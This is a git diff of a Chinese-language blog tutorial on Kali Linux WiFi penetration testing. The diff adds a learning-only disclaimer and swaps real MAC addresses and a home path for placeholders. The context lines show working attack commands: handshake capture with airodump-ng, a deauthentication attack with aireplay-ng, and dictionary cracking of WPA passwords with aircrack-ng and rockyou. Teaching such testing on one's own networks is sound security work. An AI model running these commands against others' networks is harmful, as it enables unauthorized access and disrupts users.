@@ -9,6 +9,8 @@ publish: true
 # Kali Linux 三路部署与无线安全实战（WSL + Ventoy 可移动 U 盘 + WiFi 抓包）
 
 > 参考视频：[Kali Linux 无线渗透测试教程](https://www.youtube.com/watch?v=0p78njSKLjg)
+>
+> 声明：仅用于网络安全学习，不负法律责任，一切实验都用于自身设备的破解与学习，未曾攻击过别人的网络。请勿将本教程用于非法用途，一切非法使用与本站无关。
 
 ---
 
@@ -150,13 +152,13 @@ airodump-ng wlan0mon
 锁定目标 AP 并保存抓包文件到桌面：
 
 ```bash
-airodump-ng -c <CH> --bssid <BSSID> -w /home/yanzi/桌面/handshake wlan0mon
+airodump-ng -c <CH> --bssid <BSSID> -w ~/桌面/handshake wlan0mon
 ```
 
 **实际命令示例**：
 
 ```bash
-airodump-ng -c 1 --bssid 24:69:8E:20:D2:0A -w /home/yanzi/桌面/handshake wlan0mon
+airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w ~/桌面/handshake wlan0mon
 ```
 
 ### 3.4 强制客户端重连（Deauth 攻击）
@@ -171,7 +173,7 @@ aireplay-ng -0 10 -a <BSSID> -c <STATION> wlan0mon
 **实际命令示例**：
 
 ```bash
-aireplay-ng -0 10 -a 24:69:8E:20:D2:0A -c 6C:40:E8:22:DA:F9 wlan0mon
+aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 ```
 
 - `-0 10`：发送 10 个 Deauth 断连包
@@ -233,13 +235,13 @@ sudo gunzip rockyou.txt.gz
 **使用 GitHub 字典的示例**：
 
 ```bash
-aircrack-ng -w /home/yanzi/桌面/wpa-dictionary/common.txt -b 24:69:8E:20:D2:0A /home/yanzi/桌面/handshake-01.cap
+aircrack-ng -w ~/桌面/wpa-dictionary/common.txt -b AA:BB:CC:DD:EE:FF ~/桌面/handshake-01.cap
 ```
 
 **使用 Kali 自带 rockyou 字典的示例**：
 
 ```bash
-aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 24:69:8E:20:D2:0A /home/yanzi/桌面/handshake-01.cap
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF ~/桌面/handshake-01.cap
 ```
 
 若密码命中字典，终端将显示 **`KEY FOUND! [ password ]`**。
